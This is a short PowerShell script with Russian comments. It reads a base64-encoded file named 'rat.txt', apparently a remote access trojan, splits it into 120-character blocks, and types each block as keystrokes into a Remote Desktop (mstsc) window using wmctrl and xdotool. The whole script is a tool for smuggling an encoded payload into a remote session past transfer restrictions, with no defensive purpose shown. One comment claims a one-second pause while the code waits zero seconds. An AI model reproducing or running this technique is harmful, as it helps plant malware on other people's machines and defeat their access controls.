# Путь к файлу с base64
$file = "rat.txt"

# Читаем содержимое файла
$base64Content = Get-Content -Path $file -Raw

# Количество символов в блоке (n)
$n = 120

# Получаем массив блоков из base64Content
$blocks = [System.Collections.Generic.List[string]]::new()

for ($i = 0; $i -lt $base64Content.Length; $i += $n) {
    $block = $base64Content.Substring($i, [Math]::Min($n, $base64Content.Length - $i))
    $blocks.Add($block)
}

# Передаем каждый блок как аргумент команде .\wmctrl.exe -a mstsc | .\xdotool.exe key $arg
foreach ($block in $blocks) {
    .\wmctrl.exe -a mstsc | .\xdotool.exe key $block
    Start-Sleep -Seconds 0  # Устанавливаем паузу в 1 секунду между отправкой блоков
}
